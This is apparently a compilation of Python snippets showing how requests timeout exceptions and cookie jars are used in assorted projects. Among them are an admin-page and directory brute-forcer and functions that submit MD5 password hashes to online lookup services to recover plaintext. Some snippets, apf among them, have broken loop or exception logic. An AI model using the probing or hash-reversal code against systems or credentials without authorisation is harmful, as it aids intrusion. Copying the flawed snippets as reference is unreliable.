def GetPage(self, url):
        Url = '%s://%s/%s' % (self.Protocol, self.Url, url)
        try:
            try:
                head = requests.head(Url, timeout=int(self.Timeout), headers = {'User-Agent': 'YetAnotherBrowser:Foozillia:2.3.3'})
                if head.status_code == 404:
                    return
            except requests.ConnectionError or requests.ConnectTimeout:
                print '[*] Failed to connect to target with HEAD method, trying GET.'
            resp = requests.get(Url, timeout=int(self.Timeout), headers = {'User-Agent': 'YetAnotherBrowser:Foozillia:2.3.3'})
            if resp.status_code == 302:
                print '[*] 302 Found found at %s.' %(Url)
                self.UrlList.append(Url)
            elif resp.status_code == 403:
                print '[+] 403 forbidden found at %s.' %(Url)
                self.UrlList.append(Url)
            elif resp.status_code == 200:
                print '[+] HTTP 200 OK found at %s' %(Url)
                self.UrlList.append(Url)
            else:
                pass
        except requests.Timeout:
            print '[!] Request timeout at %s' %(Url)
            pass
        except requests.ConnectionError:
            print '[!] Connection failed to %s' %(Url)
            pass
        except Exception, e:
            print '[!] Failed to fetch page: %s' %(str(e)) 
**************************************
def post(self):
        """
        Add a new nfvo. The request must provide the nfvo details.
        used by: `katana nfvo add -f [yaml file]`
        """
        new_uuid = str(uuid.uuid4())
        request.json['_id'] = new_uuid
        request.json['created_at'] = time.time()  # unix epoch

        if request.json['type'] == "OSM":
            # Create the NFVO object
            osm_username = request.json['nfvousername']
            osm_password = request.json['nfvopassword']
            osm_ip = request.json['nfvoip']
            osm_project_name = request.json['tenantname']
            osm = osmUtils.Osm(osm_ip, osm_username,
                               osm_password, osm_project_name)
            try:
                osm.get_token()
            except ConnectTimeout as e:
                logger.exception("It is time for ... Time out")
                response = dumps({'error': 'Unable to connect to NFVO'})
                return (response, 400)
            except ConnectionError as e:
                logger.exception("Unable to connect")
                response = dumps({'error': 'Unable to connect to NFVO'})
                return (response, 400)
            else:
                # Store the osm object to the mongo db
                thebytes = pickle.dumps(osm)
                request.json['nfvo'] = Binary(thebytes)
                return mongoUtils.add("nfvo", request.json)
        else:
            response = dumps({'error': 'This type nfvo is not supported'})
            return response, 400 
**************************************
def is_agent_ready(self):
        """
        Used after making a successful announce to test when the agent is ready to accept data.
        """
        try:
            response = self.client.head(self.__data_url(), timeout=0.8)

            if response.status_code is 200:
                return True
            return False
        except (requests.ConnectTimeout, requests.ConnectionError):
            logger.debug("is_agent_ready: Instana host agent connection error") 
**************************************
def gromweb(password):
    try:
        req = requests.get(url="https://md5.gromweb.com",params={"md5":password})
        source_code = req.content
        soup = BeautifulSoup(source_code,"html.parser")
        brute_text = soup.find_all("em",{"class":"long-content string"})
        plain_text = brute_text[0].text
        print("md5.gromweb.com ===> {}\n{}".format(plain_text,"="*75))
    except IndexError:
        print("md5.gromweb.com ===> Hash Don't Found!\n{}".format("=" * 75))
    except requests.ConnectionError or requests.ConnectTimeout:
        print("md5.gromweb.com ===> Connection Error!!!\n{}".format("=" * 75)) 
**************************************
def my_addr(password):
    try:
        req = requests.post(url="http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php",data={"md5":password,"x":"21","y":"12"})
        source_code = req.content
        soup = BeautifulSoup(source_code,"html.parser")
        brute_text = soup.find_all("div",{"class":"white_bg_title"})
        plain_text = brute_text[1].text.split()[2]
        print("md5.my-addr.com ===> {}\n{}".format(plain_text,"="*75))
    except IndexError:
        print("md5.my-addr.com ===> Hash Don't Found!\n{}".format("="*75))
    except requests.ConnectionError or requests.ConnectTimeout:
        print("md5.my-addr.com ===> Connection Error!!!\n{}".format("=" * 75)) 
**************************************
def _get_member_by_mid(self, mid: int) -> Optional[dict]:
        """
        根据用户id获取其信息
        :param mid: B站用户id
        :return: 用户详情 or None
        """
        get_params = {
            'mid': mid,
            'jsonp': 'jsonp'
        }
        try:
            res_json = requests.get(API_MEMBER_INFO, params=get_params, timeout=WAIT_MAX, proxies=self.cur_proxy,
                                    headers=self.headers).json()
        except ConnectTimeout as e:
            print(f'获取用户id: {mid} 详情失败: 请求接口超时, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except ReadTimeout as e:
            print(f'获取用户id: {mid} 详情失败: 接口读取超时, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except ValueError as e:
            # 解析json失败基本上就是ip被封了
            print(f'获取用户id: {mid} 详情失败: 解析json出错, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except ProxyError as e:
            print(f'获取用户id: {mid} 详情失败: 连接代理失败, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except requests.ConnectionError as e:
            # 可以断定就是代理IP地址无效
            print(f'获取用户id: {mid} 详情失败: 连接错误, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except ChunkedEncodingError as e:
            print(f'获取用户id: {mid} 详情失败: 远程主机强迫关闭了一个现有的连接, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        else:
            if res_json['code'] == -404:
                print(f'找不到用户mid:{mid}')
                raise UserNotFoundException(f'找不到用户mid:{mid}')
            if 'data' in res_json:
                return res_json['data']
            print(f'获取用户id: {mid} 详情失败: data字段不存在!')
        return 
**************************************
def downloadFile(url):
    tries = 0
    while tries < 3:
        try:
            r = requests.get(BASE_URL + url)
            r.encoding = "utf-8"
            fileContent = r.text
            return fileContent.strip(), len(fileContent)
        except (requests.ConnectionError, requests.ConnectTimeout) as e:
            tries += 1
            if tries >= 3:
                raise e


# Decorator 
**************************************
def test_connect_timeout(self):
        """
        Test that a connect timeout occurs when instantiating
        a client object with a timeout of 10 ms.
        """
        with self.assertRaises(ConnectTimeout) as cm:
            self.set_up_client(auto_connect=True, timeout=.01)
        self.assertTrue(str(cm.exception).find('timed out.')) 
**************************************
def _run(self, *args, **kwargs):
        url = self._url_template.format(
            protocol=self._runner.protocol,
            target_host=self._target_host,
            **self._url_params,
        )
        log.debug('Requesting', url=url, method=self._method)
        try:
            resp = self._runner.session.request(
                method=self._method,
                url=url,
                json=self._request_params,
                timeout=self._timeout,
            )
        except (ReadTimeout, ConnectTimeout) as ex:
            raise TransferFailed(
                f"Transfer didn't complete within timeout of {self._timeout}",
            ) from ex
        except RequestException as ex:
            raise RESTAPIError(f'Error performing REST-API call: {self._name}') from ex
        if not self._http_status_re.match(str(resp.status_code)):
            raise RESTAPIStatusMismatchError(
                f'HTTP status code "{resp.status_code}" while fetching {url}. '
                f'Expected {self._expected_http_status}: {resp.text}',
            )
        try:
            if resp.content == b'':
                # Allow empty responses
                response_dict = {}
            else:
                response_dict = resp.json()
            return self._process_response(response_dict)
        except (ValueError, UnicodeDecodeError) as ex:
            raise RESTAPIError(
                f'Error decoding response for url {url}: {resp.status_code} {resp.text}',
            ) from ex 
**************************************
def fetch(server):
        """
        This function gets your IP from a specific server.

        :param server:
        :return:
        """
        request = None
        session = requests.Session()

        try:
            request = session.get(server, timeout=2)
            content = request.text

            m = re.search(
                '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
                '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)',
                content)
            myip = m.group(0)
            return myip if len(myip) > 0 else ''
        except (requests.ConnectionError, requests.ConnectTimeout):
            log.error("Error on server {}".format(server))
            return ""
        finally:
            if request:
                request.close() 
**************************************
def DomainScanner(domain):
    url = 'https://www.virustotal.com/vtapi/v2/url/scan'
    params = {'apikey': apikey, 'url': domain}

    # attempt connection to VT API and save response as r
    try:
        r = requests.post(url, params=params)
    except requests.ConnectTimeout as timeout:
        print('Connection timed out. Error is as follows-')
        print(timeout)

    # sanitize domain after upload for safety
    domainSani = domain.replace('.', '[.]')
    # handle ValueError response which may indicate an invalid key or an error with scan
    # if an except is raised, add the domain to a list for tracking purposes
    if r.status_code == 200:
        try:
            jsonResponse = r.json()
            # print error if the scan had an issue
            if jsonResponse['response_code'] is not 1:
                print('There was an error submitting the domain for scanning.')
                print(jsonResponse['verbose_msg'])
            elif jsonResponse['response_code'] == -2:
                print('{!s} is queued for scanning.'.format(domainSani))
                delay[domain] = 'queued'
            else:
                print('{!s} was scanned successfully.'.format(domainSani))

        except ValueError:
            print('There was an error when scanning {!s}. Adding domain to error list....'.format(domainSani))
            domainErrors.append(domain)

        # return domain errors for notifying user when script completes
        time.sleep(sleeptime)  ############### IF YOU HAVE A PRIVATE ACCESS YOU CAN CHANGE THIS TO 1 ###################
        return delay

    # API TOS issue handling
    elif r.status_code == 204:
        print('Received HTTP 204 response. You may have exceeded your API request quota or rate limit.')
        print('https://support.virustotal.com/hc/en-us/articles/115002118525-The-4-requests-minute-limitation-of-the-'
              'Public-API-is-too-low-for-me-how-can-I-have-access-to-a-higher-quota-') 
**************************************
def get_pypi_version(name):
    import requests

    try:
        r = requests.get("https://pypi.org/pypi/{}/json".format(name), timeout=1.0)
    except requests.ConnectTimeout:
        raise RuntimeError("GET requests time out.")
    except requests.ConnectionError:
        raise RuntimeError("Failed connection.")
    if not r.ok:
        raise RuntimeError("Response code {} from pypi.org.".format(r.status_code))
    data = r.json()
    return data["info"]["version"] 
**************************************
def _do_request(self, *args, **kwargs):
		for name, value in self._kwargs.items():
			kwargs.setdefault(name, value)
		try:
			if self._session:
				return self._session.request(*args, **kwargs)
			else:
				return requests.request(*args, **kwargs)
		except (requests.ConnectTimeout, requests.Timeout) as error:
			six.raise_from(exceptions.TimeoutError(error), error)
		except requests.ConnectionError as error:
			six.raise_from(exceptions.ConnectionError(error), error)
		except http_client.HTTPException as error:
			six.raise_from(exceptions.ProtocolError(error), error) 
**************************************
def _request(self, url, params={}):
        # 应该使用统一的request函数去请求，此处待重构
        try:
            response = self.session.get(url, headers=FOLLOWER_HEADER, params=params, timeout=10)
            return response
        except requests.ConnectionError, requests.ConnectTimeout:
            logger.error('%s请求超时') 
**************************************
def flash(self):
        logger.debug("in KodiGroup Flash")
        try:
            self.groupResource.action(alert="select")
        except QhueException() as exc:
            logger.error("Hue Error: {}".format(exc))
            reporting.process_exception(exc)
        except ConnectTimeout as exc:
            logger.error("Hue Error: {}".format(exc)) 
**************************************
def update_weather():
    payload = {
        'id': CITY_ID,
        'units': 'metric',
        'appid': API_KEY
    }
    global temp
    try:
        r = requests.get(url=url, params=payload)
        temp = r.json().get('main').get('temp')
        print('Temperture = ' + str(temp) + ' C')
    except (requests.ConnectionError, requests.ConnectTimeout):
        print('Connection Error') 
**************************************
def get_status(self, ip, port, token):
        url = 'http://{}:{}{}/{}/state/on'.format(ip, port, self.endpoint, token)
        try:
            res = requests.get(url, timeout=1)
        except ConnectTimeout:
            return 'Unknown'
        return  'On' if res.json().get('value') else 'Off' 
**************************************
def apf(target, proxy, user_agent):
    global dic_file
    global url

    headers = {'User-Agent': user_agent}

    try:
        dic_file = open("dictionary.txt", "r", encoding="utf_8")

    except FileNotFoundError as h:
        exit(bcolor.FAIL + "[!] There was an error reading file!\n{}".format(h) + bcolor.ENDC)

    for aline in dic_file.readlines():
        url = target + '/' + aline

    try:
        req = requests.head(url, headers=headers, proxies=proxy)

        if req.status_code == 200:
            print(bcolor.OKGREAN + "[+]" + url + bcolor.ENDC)
            print(ld)
        else:
            print(bcolor.FAIL + 'Admin Page Not Found!' + bcolor.ENDC)
            print(ld)

        dic_file.close()

    except requests.ConnectTimeout:
        print(bcolor.FAIL + "[*] Website Don\'t Response" + bcolor.ENDC)
        print(ld)

    except KeyboardInterrupt:
        print(Ctrl_C)
        exit(ld)

    return

# ==================================Web server================================== 
**************************************
def search(self, user_id, pattern, page=1):
        for i, mirror in enumerate(self.mirrors):
            logger.info("Fetching torrents from " + mirror)
            if not self.search_urls[i]:
                try:
                    self.search_urls[i] = self.get_search_url(mirror)
                except (requests.exceptions.SSLError, TypeError) as error:
                    logger.error(f"Error when requesting home page of {mirror}")
                    logger.opt(exception=True).trace(error)
                    continue
                except (requests.ConnectTimeout, requests.ReadTimeout):
                    logger.info("Timeout")
                    continue
            search_url = self.search_urls[i]

            page_param = "&page=" + str(page - 1)
            try:
                html_page = requests.get(search_url + f"?q={pattern}{page_param}", timeout=5)
            except (requests.ConnectTimeout, requests.ReadTimeout):
                logger.info("Timeout")
                continue

            soup = BeautifulSoup(html_page.text, features="html.parser")

            torrents = []
            rows = soup.find_all("tr")[1:]

            for row in rows:
                link = row.find("a", class_="detLink")
                seeders, leechers = [int(td.text) for td in row.find_all("td")[2:]]
                extra = row.font.text.split(", ")

                torrents.append(
                    Torrent(
                        title=link.text,
                        magnet=row.find("a", href=re.compile(r"^magnet:\?"))["href"],
                        url=mirror + "/" + link["href"].lstrip("/"),
                        seeders=seeders,
                        leechers=leechers,
                        date=extra[0][len("Uploaded ") :],
                        size=extra[1][len("Size ") :],
                        uploader=extra[2][len("ULed by ") :],
                    )
                )

            if torrents:
                return Search(user_id, mirror, pattern, torrents, [page])
            else:
                logger.info("No results")
                pass

        raise LookupError 
**************************************
def get(url, params=None, data=None, retries=3, timeout=20, oauth=False):
	'''
	This function wraps requests.get to handle the YouTube API specific error codes that may pop up.
	'''
	ignore_errors = IGNORE_ERRORS
	try:
		if oauth: 
			http_auth = get_oauth()
			response = http_auth.request(url, 'GET', headers=params)
			if type(response)==tuple: return response[1].decode('utf-8','ignore') # ugly but find; TODO
		else:
			response = requests.get(url,params=params, data=data, timeout=TIMEOUT)
		if response.status_code==200: 
			return response.json()
		elif response.status_code == 404 :
			logger.info("No items found for {data}".format(**locals))
			return {} 
		elif response.status_code == 400 : 
			if not ignore_errors:
				raise Exception("Bad Request: you probably have incorrect parameter (values), refer to the API documentation")
			else:
				logger.warn("400 exception!")
				return {}
		elif response.status_code == 403 :
			if not ignore_errors:
				raise Exception("Forbidden status code (403): your API Key is wrong or your options require OAuth! (not supported here)")
			else:
				logger.warn('403: forbidden')
				return {'status':'forbidden'}
		elif response.status_code == 401 :
			if not ignore_errors:
				raise Exception("You misspelled a parameter, have a bad API key or require (new) OAuth (try reset_oauth?) ")
			else:
				logger.warn('401 error!')
				return {}
		else:
			raise Exception("incorrect status code! {response.status_code} : {response.reason}".format(**locals()))
	except (ConnectTimeout, ConnectionError):
		if retries > 0:
			return get(url, params, data, retries-1, timeout)
		else:
			logger.warning('retries for {url} exceeded (params={params}, data={data})'.format(**locals()))
			return {} 
**************************************
def execute_request(self, data, method, payment=None):
        rest = method.startswith("rest/")

        headers = {
            "Accept": "application/json"
        }

        if rest:
            data.update({
                "userName": self.merchant.get('username'),
                'password': self.merchant.get('password')
            })
        else:
            headers.update({"Content-Type": "application/json"})
            data = json.dumps(data)

        try:
            response = requests.post(
                '{}/{}.do'.format(self.__default_gateway_address, method), data=data, headers=headers)
        except (requests.ConnectTimeout,
                requests.ConnectionError,
                requests.HTTPError):
            if payment:
                payment.status = Status.FAILED
                payment.save()
            raise NetworkException(payment.uid if payment else None)

        if rest:
            data.update({'password': '****'})

        LogEntry.objects.create(
            action=method,
            bank_id=payment.bank_id if payment else None,
            payment_id=payment.uid if payment else None,
            response_text=response.text, request_text=json.dumps(data) if rest else data)

        if response.status_code != 200:
            if payment:
                payment.status = Status.FAILED
                payment.save()
            raise ProcessingException(payment.uid if payment else None, response.text,
                                      response.status_code)
        try:
            response = response.json()
        except (ValueError, UnicodeDecodeError):
            if payment:
                payment.status = Status.FAILED
                payment.save()
            raise ProcessingException(payment.uid if payment.uid else None)

        if int(response.get('errorCode', 0)) != 0:
            if payment:
                payment.error_code = response.get('errorCode')
                payment.error_message = response.get('errorMessage')
                payment.status = Status.FAILED
                payment.save()
            raise ProcessingException(payment.uid if payment else None, response.get('errorMessage'),
                                      response.get('errorCode'))

        return response 
**************************************
def DomainScanner(domain):
    url = 'https://www.virustotal.com/vtapi/v2/url/scan'
    params = {'apikey': apikey, 'url': domain}

    # attempt connection to VT API and save response as r
    try:
        r = client.post(url, params=params)
    except requests.ConnectTimeout as timeout:
        print('Connection timed out. Error is as follows-')
        print(timeout)

    # sanitize domain after upload for safety
    domainSani = domain.replace('.', '[.]')

    print(domainSani)
    print(r)

    # handle ValueError response which may indicate an invalid key or an error with scan
    # if an except is raised, add the domain to a list for tracking purposes
    if r.status_code == 200:
        try:
            jsonResponse = r.json()
            # print error if the scan had an issue
            if jsonResponse['response_code'] is not 1:
                print('There was an error submitting the domain for scanning.')
                print(jsonResponse['verbose_msg'])
            elif jsonResponse['response_code'] == -2:
                print('{!s} is queued for scanning.'.format(domainSani))
                delay[domain] = 'queued'
            else:
                print('{!s} was scanned successfully.'.format(domainSani))

        except ValueError:
            print('There was an error when scanning {!s}. Adding domain to error list....'.format(domainSani))
            domainErrors.append(domain)

        # return domain errors for notifying user when script completes
        time.sleep(15)  ############### IF YOU HAVE A PRIVATE ACCESS YOU CAN CHANGE THIS TO 1 ###################
        return delay

    # API TOS issue handling
    elif r.status_code == 204:
        print('Received HTTP 204 response. You may have exceeded your API request quota or rate limit.')
        print('https://support.virustotal.com/hc/en-us/articles/115002118525-The-4-requests-minute-limitation-of-the-'
              'Public-API-is-too-low-for-me-how-can-I-have-access-to-a-higher-quota-') 
**************************************
def run(self):

        while self.shared_memory.run_threads:
            try:
                requests.get(
                    'http://www.google.com/',
                    timeout=self.shared_memory.timeout,
                    proxies=self.proxies
                )
            except requests.ConnectTimeout:
                self.print(f'Attempting to establish Tor connection: Waiting...', methods.NORMAL)
                sleep(1)
                continue
            else:
                break

        while self.shared_memory.run_threads:
            url = self.shared_memory.get_url(self.thread_id)
            if url is None:
                if self.shared_memory.any_active():
                    sleep(uniform(0, 1))
                    self.print(f'Attempting to get new url: Waiting...', methods.NORMAL)
                    continue
                else:
                    self.shared_memory.run_threads = False

                    self.print(f'No urls to process: Stop all threads', methods.WARNING)
                    break

            try:
                request = requests.get(
                    url,
                    timeout=self.shared_memory.timeout,
                    proxies=self.proxies
                )

                if 'text/html' not in request.headers['Content-Type']:
                    raise IncorrectContentType

                html = request.text

                title, content, words, urls = methods.get_values(html, url)

                self.thread_memory.append((title, content, words, url))

                if urls:
                    for x in urls:
                        self.shared_memory.add_url(x)
                else:
                    raise NoURLsFound

            except Exception as e:
                self.print(f'{type(e).__name__}: {url}', methods.WARNING)
            else:
                self.print(f'Successfully processed: {url}', methods.SUCCESS)

            self.shared_memory.set_inactive(self.thread_id) 
**************************************
def execute(self, method, *args):
		payload = dumps(args, methodname=method, allow_none=True)
		body = gzip.compress(payload.encode('utf8'))
		try:
			res = await self.loop.run_in_executor(None, self.__request, body)
			data, _ = loads(res.text, use_datetime=True)
			if isinstance(data, (tuple, list)) and len(data) > 0 and len(data[0]) > 0:
				if isinstance(data[0][0], dict) and 'faultCode' in data[0][0]:
					raise DedimaniaFault(faultCode=data[0][0]['faultCode'], faultString=data[0][0]['faultString'])
				self.retries = 0
				return data[0]
			raise DedimaniaTransportException('Invalid response from dedimania!')
		except (ConnectionError, ReadTimeout, ConnectionRefusedError) as e:
			raise DedimaniaTransportException(e) from e
		except ConnectTimeout as e:
			raise DedimaniaTransportException(e) from e
		except DedimaniaTransportException:
			# Try to setup new session.
			self.retries += 1
			if self.retries > 5:
				raise DedimaniaTransportException('Dedimania didn\'t gave the right answer after few retries!')
			self.client = requests.session()
			try:
				await self.authenticate()
				return await self.execute(method, *args)
			except Exception as e:
				logger.error('XML-RPC Fault retrieved from Dedimania: {}'.format(str(e)))
				handle_exception(e, __name__, 'execute')
				raise DedimaniaTransportException('Could not retrieve data from dedimania!')
		except DedimaniaFault as e:
			if 'Bad SessionId' in e.faultString or ('SessionId' in e.faultString and 'not found' in e.faultString):
				try:
					self.retries += 1
					if self.retries > 5:
						raise DedimaniaTransportException('Max retries reached for reauthenticating with dedimania!')

					# Save original session ID.
					original_session_id = '{}'.format(self.session_id)

					# Reauthenticate
					await self.authenticate()

					# Replace session_id in args.
					if len(args) > 0 and len(args[0]) > 0 and isinstance(args[0][0], dict) and 'params' in args[0][0]:
						new_params = list(args[0][0]['params'])
						if len(new_params) > 0 and isinstance(new_params[0], str) and new_params[0] == original_session_id:
							new_params[0] = self.session_id
							args[0][0]['params'] = tuple(new_params)

					# Try again.
					return await self.execute(method, *args)
				except:
					return
			logger.error('XML-RPC Fault retrieved from Dedimania: {}'.format(str(e)))
			handle_exception(e, __name__, 'execute', extra_data={
				'dedimania_retries': self.retries,
			})
			raise DedimaniaTransportException('Could not retrieve data from dedimania!') 
**************************************
def check_proxy(proxy_queue, timeout, proxies):

    # Update check url - Thanks ChipWolf #1282 and #1281
    proxy_test_url = 'https://pgorelease.nianticlabs.com/plfe/rpc'
    proxy = proxy_queue.get()

    if proxy and proxy[1]:

        log.debug('Checking proxy: %s', proxy[1])

        try:
            proxy_response = requests.post(proxy_test_url, '', proxies={'http': proxy[1], 'https': proxy[1]}, timeout=timeout)

            if proxy_response.status_code == 200:
                log.debug('Proxy %s is ok', proxy[1])
                proxy_queue.task_done()
                proxies.append(proxy[1])
                return True

            elif proxy_response.status_code == 403:
                log.error("Proxy %s is banned - got status code: %s", proxy[1], str(proxy_response.status_code))
                return False

            else:
                proxy_error = "Wrong status code - " + str(proxy_response.status_code)

        except requests.ConnectTimeout:
            proxy_error = "Connection timeout (" + str(timeout) + " second(s) ) via proxy " + proxy[1]

        except requests.ConnectionError:
            proxy_error = "Failed to connect to proxy " + proxy[1]

        except Exception as e:
            proxy_error = e

    else:
            proxy_error = "Empty proxy server"

    log.warning('%s', proxy_error)
    proxy_queue.task_done()

    return False


# Check all proxies and return a working list with proxies 

Python requests.cookies() Examples

**************************************
def test_cookie_as_dict_keeps_len(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        d1 = dict(jar)
        d2 = dict(jar.iteritems())
        d3 = dict(jar.items())

        assert len(jar) == 2
        assert len(d1) == 2
        assert len(d2) == 2
        assert len(d3) == 2 
**************************************
def test_cookie_as_dict_keeps_items(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        d1 = dict(jar)
        d2 = dict(jar.iteritems())
        d3 = dict(jar.items())

        assert d1['some_cookie'] == 'some_value'
        assert d2['some_cookie'] == 'some_value'
        assert d3['some_cookie1'] == 'some_value1' 
**************************************
def test_cookie_parameters(self):
        key = 'some_cookie'
        value = 'some_value'
        secure = True
        domain = 'test.com'
        rest = {'HttpOnly': True}

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value, secure=secure, domain=domain, rest=rest)

        assert len(jar) == 1
        assert 'some_cookie' in jar

        cookie = list(jar)[0]
        assert cookie.secure == secure
        assert cookie.domain == domain
        assert cookie._rest['HttpOnly'] == rest['HttpOnly'] 
**************************************
def test_cookie_as_dict_keeps_len(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        d1 = dict(jar)
        d2 = dict(jar.iteritems())
        d3 = dict(jar.items())

        assert len(jar) == 2
        assert len(d1) == 2
        assert len(d2) == 2
        assert len(d3) == 2 
**************************************
def test_cookie_as_dict_keeps_items(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        d1 = dict(jar)
        d2 = dict(jar.iteritems())
        d3 = dict(jar.items())

        assert d1['some_cookie'] == 'some_value'
        assert d2['some_cookie'] == 'some_value'
        assert d3['some_cookie1'] == 'some_value1' 
**************************************
def __init__(self, password='', proxies=None, username='', email='', cred_root='data'):
        self.email = email
        self.username = username
        self.password = password
        self.req_builder = RequestBuilder()
        self.bookmark_manager = BookmarkManager()
        self.http = requests.session()
        self.proxies = proxies

        data_path = os.path.join(cred_root, self.email) + os.sep
        if not os.path.isdir(data_path):
            os.makedirs(data_path)

        self.registry = Registry('{}registry.dat'.format(data_path))

        cookies = self.registry.get(Registry.Key.COOKIES)
        if cookies is not None:
            self.http.cookies.update(cookies) 
**************************************
def request(self, method, url, data=None, files=None, extra_headers=None):
        headers = CaseInsensitiveDict([
            ('Referer', HOME_PAGE),
            ('X-Requested-With', 'XMLHttpRequest'),
            ('Accept', 'application/json'),
            ('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8'),
            ('User-Agent', AGENT_STRING)])
        csrftoken = self.http.cookies.get('csrftoken')
        if csrftoken:
            headers.update([('X-CSRFToken', csrftoken)])

        if extra_headers is not None:
            for h in extra_headers:
                headers.update([(h, extra_headers[h])])

        response = self.http.request(method, url, data=data, headers=headers, files=files, proxies=self.proxies)
        response.raise_for_status()
        self.registry.update(Registry.Key.COOKIES, response.cookies)
        return response 
**************************************
def test_cookie_as_dict_keeps_len(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        d1 = dict(jar)
        d2 = dict(jar.iteritems())
        d3 = dict(jar.items())

        assert len(jar) == 2
        assert len(d1) == 2
        assert len(d2) == 2
        assert len(d3) == 2 
**************************************
def test_cookie_as_dict_keeps_items(self):
        key = 'some_cookie'
        value = 'some_value'

        key1 = 'some_cookie1'
        value1 = 'some_value1'

        jar = requests.cookies.RequestsCookieJar()
        jar.set(key, value)
        jar.set(key1, value1)

        d1 = dict(jar)
        d2 = dict(jar.iteritems())
        d3 = dict(jar.items())

        assert d1['some_cookie'] == 'some_value'
        assert d2['some_cookie'] == 'some_value'
        assert d3['some_cookie1'] == 'some_value1' 
**************************************
def auth_eone_logout():
    with open(work_folder + "/" + session_id_file, 'a+') as fp:
        JSESSIONID = fp.read()
    if len(JSESSIONID) == 0:
        return False
    with open(work_folder + "/" + logout_sid_file, 'a+') as fp:
        logout_sid = int(fp.read())
    if logout_sid == 0:
        return False
    cookie_jar = RequestsCookieJar()
    cookie_jar.set("session_for:srun_cas_php", JSESSIONID, domain="ipgw.neu.edu.cn")
    res = requests.post(eone_logout_url, {'action': 'dm', 'sid': logout_sid}, cookies=cookie_jar)
    if "失败" in res.content:
        return False
    if "下线请求已发送" in res.content:
        return True
    return False 
**************************************
def load_cookies(self):
        """
        Load any stored cookies for the plugin that have not expired.

        :return: list of the restored cookie names
        """
        if not self.session or not self.cache:
            raise RuntimeError("Cannot loaded cached cookies in unbound plugin")

        restored = []

        for key, value in self.cache.get_all().items():
            if key.startswith("__cookie"):
                cookie = requests.cookies.create_cookie(**value)
                self.session.http.cookies.set_cookie(cookie)
                restored.append(cookie.name)

        if restored:
            self.logger.debug("Restored cookies: {0}".format(", ".join(restored)))
        return restored 
**************************************
def clear_cookies(self, cookie_filter=None):
        """
        Removes all of the saved cookies for this Plugin. To filter the cookies that are deleted
        specify the ``cookie_filter`` argument (see :func:`save_cookies`).

        :param cookie_filter: a function to filter the cookies
        :type cookie_filter: function
        :return: list of the removed cookie names
        """
        if not self.session or not self.cache:
            raise RuntimeError("Cannot loaded cached cookies in unbound plugin")

        cookie_filter = cookie_filter or (lambda c: True)
        removed = []

        for key, value in sorted(self.cache.get_all().items(), key=operator.itemgetter(0), reverse=True):
            if key.startswith("__cookie"):
                cookie = requests.cookies.create_cookie(**value)
                if cookie_filter(cookie):
                    del self.session.http.cookies[cookie.name]
                    self.cache.set(key, None, 0)
                    removed.append(key)

        return removed 
**************************************
def login(self, mobile=False, useProxy=False):
        self.headers = c.headers
        if not self.cookie:
            postURL = self.preLogin(useProxy=useProxy)
            res = self.post(postURL, data=self.data, useProxy=useProxy)
            # Parse HTML Form
            form = BeautifulSoup(res.text, "html.parser").findAll("form")[
                0]  # Get Form
            params = dict()
            for field in form:
                # Add each field to params
                params[field["name"]] = field["value"]
            self.headers["Host"] = c.host  # Set Host to Bing Server
            self.cookies.clear()
            res = self.post(form.get("action"), data=params, useProxy=useProxy)
        if mobile:
            self.headers = c.mobileHeaders 
**************************************
def login(self):
        """
        登录
        :return: dict
            success 为是否成功的 bool 值
            message 为返回的消息
        """
        data = {
            "matchuser": self.username,
            "matchpass": self.password  # 是的，是 http 明文密码emmm
        }

        resp = self.session.post(current_config.CHAIWUBI_API, data=data)
        resp_json = resp.json()

        if int(resp_json['code']) == 200:
            logger.info(f"登录成功！消息：{resp_json['msg']}")
            self.session.cookies = cookiejar_from_dict({"matchuser": self.username})  # cookie 是通过 js 设置的，直接用的用户名。。。
            return True
        else:
            logger.info(f"登录异常，消息: {resp_json['msg']}")
            return False 
**************************************
def __init__(self, path, *args, **kwargs):
        super(Session, self).__init__(*args, **kwargs)
        self._path = path
        self['headers'] = {}
        self['cookies'] = {}
        self['auth'] = {
            'type': None,
            'username': None,
            'password': None
        } 
**************************************
def cookies(self):
        jar = RequestsCookieJar()
        for name, cookie_dict in self['cookies'].items():
            jar.set_cookie(create_cookie(
                name, cookie_dict.pop('value'), **cookie_dict))
        jar.clear_expired_cookies()
        return jar 
**************************************
def cookies(self, jar):
        """
        :type jar: CookieJar
        """
        # http://docs.python.org/2/library/cookielib.html#cookie-objects
        stored_attrs = ['value', 'path', 'secure', 'expires']
        self['cookies'] = {}
        for cookie in jar:
            self['cookies'][cookie.name] = dict(
                (attname, getattr(cookie, attname))
                for attname in stored_attrs
            ) 
**************************************
def test_client_sends_cookies():
    s = requests.Session()
    s.cookies = RequestsCookieJar()
    s.cookies['foo'] = 'bar'
    with patch('sseclient.requests.Session.send') as m:
        sseclient.SSEClient('http://blah.com', session=s)
        prepared_request = m.call_args[0][0]
